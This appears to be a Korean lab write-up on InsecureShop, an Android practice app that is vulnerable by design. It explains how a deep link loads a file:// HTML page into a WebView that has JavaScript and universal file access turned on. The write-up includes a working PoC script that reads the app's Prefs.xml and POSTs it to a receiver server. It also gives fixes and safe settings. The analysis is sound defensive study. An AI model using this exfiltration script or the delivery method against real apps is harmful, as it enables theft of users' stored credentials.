# InsecureShop - Insecure WebView Properties Enabled

## 1. 개요

`InsecureShop`의 `WebViewActivity`를 분석한 결과, 외부에서 전달한 URL을 WebView에 로드할 수 있는 구조에서 위험한 WebView 설정이 함께 활성화되어 있음을 확인하였다.

특히 `JavaScript` 실행이 허용되어 있고, `file://` 문맥에서 다른 출처로 접근할 수 있는 `setAllowUniversalAccessFromFileURLs(true)`가 활성화되어 있었다. 이 설정은 외부에서 로드한 로컬 HTML 파일이 JavaScript를 실행하고, 앱 내부 파일을 읽은 뒤 외부 서버로 전송하는 흐름으로 이어질 수 있다.

동적 검증에서는 `/sdcard/Download/webview_poc.html` 파일을 `file://` URL로 `WebViewActivity`에 전달하였다. 이후 해당 HTML 내부 JavaScript가 `/data/data/com.insecureshop/shared_prefs/Prefs.xml`을 읽고, 로컬 수신 서버로 POST 전송하는 것을 확인하였다.

## 2. 취약점 요약

| 항목 | 내용 |
|---|---|
| 취약점명 | `Insecure WebView Properties Enabled` |
| 취약점 유형 | 위험한 WebView 설정 활성화 |
| 영향 | 외부에서 로드한 `file://` HTML을 통해 앱 내부 파일 탈취 가능 |
| 분석 도구 | `jadx`, `adb` |
| 핵심 컴포넌트 | `WebViewActivity` |
| 주요 설정 | `setJavaScriptEnabled(true)`, `setAllowUniversalAccessFromFileURLs(true)` |

## 3. 분석 환경

| 항목 | 내용 |
|---|---|
| 대상 앱 | `InsecureShop` |
| 실행 환경 | `Nox` |
| 운영체제 | `Android` |
| 정적 분석 | `jadx` |
| 동적 검증 | `adb`, `python http.server` |
| 검증 대상 파일 | `/data/data/com.insecureshop/shared_prefs/Prefs.xml` |

## 4. 분석 방법

이번 항목은 WebView 설정과 외부 URL 로딩 흐름이 결합될 때 로컬 파일 탈취가 가능한지 확인하는 방식으로 진행하였다.

1. `AndroidManifest.xml`에서 `WebViewActivity`가 외부 딥링크로 실행 가능한지 확인하였다.
2. `WebViewActivity`의 WebView 설정에서 위험 옵션이 활성화되어 있는지 확인하였다.
3. 외부 입력 URL이 WebView의 `loadUrl()`까지 도달하는지 확인하였다.
4. 공격용 HTML 파일을 Nox 내부 `/sdcard/Download/webview_poc.html` 경로에 배치하였다.
5. `file://` URL을 딥링크로 전달해 InsecureShop WebView 안에서 로컬 HTML을 실행하였다.
6. 로컬 수신 서버에서 앱 내부 `Prefs.xml` 내용이 POST로 전송되는지 확인하였다.

## 5. 상세 분석

### 5.1 WebViewActivity 딥링크 진입점

Manifest를 확인한 결과 `WebViewActivity`는 아래와 같이 `VIEW`, `DEFAULT`, `BROWSABLE` intent-filter를 가지고 있었다.

```xml
<activity android:name="com.insecureshop.WebViewActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="insecureshop"
            android:host="com.insecureshop"/>
    </intent-filter>
</activity>
```

이 설정으로 인해 외부 앱이나 `adb` 명령은 아래 형태의 URI를 통해 `WebViewActivity`를 실행할 수 있다.

```text
insecureshop://com.insecureshop/web?url=...
```

즉 WebView가 로드할 URL을 외부에서 전달할 수 있는 진입점이 존재한다.

### 5.2 위험한 WebView 설정 활성화

`WebViewActivity.onCreate()`를 확인한 결과, WebView 설정에서 JavaScript 실행과 file URL의 universal access가 활성화되어 있었다.

```java
WebSettings settings = webview.getSettings();
settings.setJavaScriptEnabled(true);

WebSettings settings4 = webview.getSettings();
settings4.setAllowUniversalAccessFromFileURLs(true);
```

`setJavaScriptEnabled(true)`는 WebView 안에서 JavaScript 실행을 허용한다. 단독으로도 공격 표면이 커지지만, 외부 입력 URL을 WebView에 로드하는 구조와 결합될 경우 위험도가 증가한다.

`setAllowUniversalAccessFromFileURLs(true)`는 `file://` 문맥에서 실행되는 JavaScript가 다른 출처의 리소스에 접근할 수 있도록 허용한다. 이 값은 기본값이 안전하게 비활성화되어야 하는 성격의 옵션이며, 로컬 HTML 파일을 통한 데이터 접근 및 외부 전송 시나리오와 직접 연결된다.

분석 대상 코드에서는 `setAllowFileAccessFromFileURLs(true)`가 별도로 확인되지는 않았지만, 실제 동적 검증에서 `file://` HTML을 통해 앱 내부 `Prefs.xml` 내용이 수신 서버로 전송되는 것을 확인하였다.

### 5.3 외부 URL이 WebView 로딩으로 연결되는 구조

`WebViewActivity`는 딥링크로 전달된 URI를 기준으로 경로를 분기한다. 이 중 `/web` 경로에서는 `url` 파라미터 값을 WebView에 로드하는 흐름이 존재한다.

```java
Uri uri = intent.getData();
String queryParameter = uri != null ? uri.getQueryParameter("url") : null;
webview.loadUrl(queryParameter);
```

따라서 공격자는 원격 URL뿐 아니라 아래와 같은 `file://` URL도 WebView에 전달할 수 있다.

```text
insecureshop://com.insecureshop/web?url=file:///sdcard/Download/webview_poc.html
```

이 구조에서는 외부에서 지정한 로컬 HTML 파일이 InsecureShop WebView 내부에서 실행될 수 있다.

### 5.4 PoC HTML 동작 흐름

검증에 사용한 HTML은 `/data/data/com.insecureshop/shared_prefs/Prefs.xml` 파일을 읽고, 그 결과를 수신 서버로 전송하도록 구성하였다.

```html
<script>
const target = "file:///data/data/com.insecureshop/shared_prefs/Prefs.xml";
const receiver = "http://192.168.250.23:8080/upload";

const read = new XMLHttpRequest();
read.open("GET", target, true);

read.onload = function () {
  const send = new XMLHttpRequest();
  send.open("POST", receiver, true);
  send.setRequestHeader("Content-Type", "text/plain");
  send.send(read.responseText);
};

read.send();
</script>
```

이 PoC는 다음 흐름을 재현한다.

```text
file:// HTML 로드
-> JavaScript 실행
-> InsecureShop 내부 Prefs.xml 읽기
-> 수신 서버로 POST 전송
```

## 6. 영향

이 취약점을 악용하면 동일 기기에 설치된 악성 앱이나 공격자가 제어하는 입력 경로를 통해 InsecureShop WebView에 로컬 HTML을 로드하게 만들 수 있다. 이후 JavaScript와 file URL universal access 설정을 이용해 앱 내부 파일을 읽고 외부 서버로 전송할 수 있다.

실제 서비스 환경에서 유사한 구성이 존재할 경우 다음과 같은 문제가 발생할 수 있다.

- 앱 내부 shared preference 파일 탈취 가능
- 사용자명, 비밀번호, 세션 값 등 민감정보 노출 가능
- 로컬 파일 기반 JavaScript 실행을 통한 추가 공격 가능
- WebView URL 검증 취약점과 결합된 데이터 유출 가능
- 앱 신뢰 영역 안에서 악성 HTML이 실행되는 문제 발생

이번 검증에서는 `Prefs.xml`에 저장된 `password`, `data`, `productList` 값이 외부 수신 서버로 전송되는 것을 확인하였다.

## 7. 대응 방안

- 외부 입력으로 전달된 URL을 WebView에 직접 로드하지 않아야 한다.
- WebView에서 반드시 필요한 경우가 아니라면 JavaScript를 비활성화해야 한다.
- `setAllowUniversalAccessFromFileURLs(true)`를 사용하지 않아야 한다.
- `file://` URL 로딩을 차단하거나 허용 경로를 엄격하게 제한해야 한다.
- WebView에 로드 가능한 scheme, host, path를 allowlist 기반으로 검증해야 한다.
- 앱 내부 파일을 WebView JavaScript가 접근할 수 있는 구조로 노출하지 않아야 한다.
- 민감정보는 평문 shared preference에 저장하지 않고, Android Keystore 등을 활용해 보호해야 한다.

안전한 설정 예시는 다음과 같다.

```java
WebSettings settings = webview.getSettings();
settings.setJavaScriptEnabled(false);
settings.setAllowUniversalAccessFromFileURLs(false);
settings.setAllowFileAccessFromFileURLs(false);
```

JavaScript가 필요한 화면이라면 외부 URL 또는 `file://` URL을 함께 허용하지 않도록 별도 WebView를 분리하거나, 로드 가능한 출처를 명확히 제한해야 한다.

## 8. 결론

`WebViewActivity`는 외부 딥링크를 통해 URL을 전달받아 WebView에 로드할 수 있는 구조였고, 해당 WebView에는 `JavaScript` 실행과 `file://` universal access가 활성화되어 있었다.

동적 검증에서는 `file:///sdcard/Download/webview_poc.html`을 WebView에 로드한 뒤, HTML 내부 JavaScript가 앱 내부 `Prefs.xml` 파일을 읽고 수신 서버로 POST 전송하는 것을 확인하였다. 서버에서는 `2552 bytes`의 데이터가 수신되었고, 저장된 파일에서 `Prefs.xml` 내용이 확인되었다.

따라서 이번 항목은 **위험한 WebView 속성 활성화와 외부 URL 로딩 구조가 결합되어 앱 내부 데이터 탈취로 이어질 수 있는 취약점**으로 정리할 수 있다.

## 9. 취약점 테스트

### 1. WebViewActivity 딥링크 진입점 확인

![WebViewActivity 딥링크 진입점 확인](../images/17-Insecure%20Webview%20Properties%20Enabled/01-webviewactivity-deeplink.png)

`WebViewActivity`는 `VIEW`, `DEFAULT`, `BROWSABLE` intent-filter를 가지고 있으며, `insecureshop://com.insecureshop` 딥링크를 통해 외부에서 실행할 수 있었다.

### 2. 위험한 WebView 설정 확인

![위험한 WebView 설정 확인](../images/17-Insecure%20Webview%20Properties%20Enabled/02-webview-insecure-settings.png)

`WebViewActivity`에서 `setJavaScriptEnabled(true)`와 `setAllowUniversalAccessFromFileURLs(true)`가 활성화되어 있었다. 이 두 설정은 `file://` HTML 기반 JavaScript 실행 및 외부 전송 시나리오의 핵심 조건이다.

### 3. file:// HTML을 WebViewActivity에 전달

![file URL을 WebViewActivity에 전달](../images/17-Insecure%20Webview%20Properties%20Enabled/03-am-start-file-url.png)

`nox_adb shell am start` 명령으로 `file:///sdcard/Download/webview_poc.html`을 `url` 파라미터에 담아 `WebViewActivity`로 전달하였다. 실행 결과 `Status: ok`와 함께 `com.insecureshop/.WebViewActivity`가 실행되었다.

### 4. 수신 서버에서 POST 요청 확인

![수신 서버에서 POST 요청 확인](../images/17-Insecure%20Webview%20Properties%20Enabled/04-server-post-received.png)

로컬 수신 서버 역할의 `upload.py`에서 `/upload` 경로로 POST 요청이 들어온 것을 확인하였다. 수신 데이터 길이는 `2552 bytes`였고, Content-Type은 `text/plain`이었다.

### 5. 탈취된 Prefs.xml 내용 확인

![탈취된 Prefs.xml 내용 확인](../images/17-Insecure%20Webview%20Properties%20Enabled/05-exfiltrated-prefs-file.png)

서버가 저장한 `exfiltrated_file.bin` 파일을 확인한 결과, `Prefs.xml` 내용이 저장되어 있었다. 출력에는 `password`, `data`, `productList` 등 InsecureShop 내부 shared preference 값이 포함되어 있어 로컬 파일 탈취가 실제로 성공했음을 확인할 수 있었다.

## 10. 참고

- Android Developers - WebSettings
- Android Developers - WebView security
- InsecureShop WebViewActivity 분석 결과
